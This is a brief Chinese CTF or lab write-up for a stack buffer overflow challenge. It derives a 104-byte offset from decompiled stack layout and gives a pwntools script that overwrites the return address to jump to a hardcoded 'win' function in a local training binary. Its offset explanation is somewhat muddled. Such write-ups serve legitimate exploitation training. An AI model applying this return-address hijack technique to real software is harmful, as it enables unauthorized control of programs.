# 挑战简介
没啥好说的，写了有10来天吧，hard难度，难的就在未知

# 思路
我们根据上一题的思路,我们可以得知,offset(偏移量)是未知的,但是经过这几天折磨,偏移量这个变量,我们很容易得到
**如下**
```
__int64 challenge()
{
  int *v0; // rax
  char *v1; // rax
  __int64 buf[10]; // [rsp+20h] [rbp-60h] BYREF
  __int16 v4; // [rsp+70h] [rbp-10h]
  int v5; // [rsp+74h] [rbp-Ch]
  size_t nbytes; // [rsp+78h] [rbp-8h]
```
我们对比上一题的定义格式,我们发现,有两项是隐藏的
就是此两项
```
  __int64 savedregs; 
  void *retaddr; 
```
所以你的offset不能是78h-20h=88如此简单,因为我们要覆盖的是函数的返回地址
而返回地址固定需要16的偏移量,因此最终的offset而是88+16=104
**答案如下**
```
#!/usr/bin/python
from pwn import *
import struct

context(os='linux',arch='AMD64',log_level='debug')
p = process('/challenge/binary-exploitation-control-hijack-2')

p.recvuntil('Send your payload (up to 4096 bytes)!\n')
win_authed_address = p64(0x4015f5)    
payload = b'a' * 104 + win_authed_address
p.send(payload)
p.recvall()
```
**那个关键点真的找了很久,给个收藏?!**
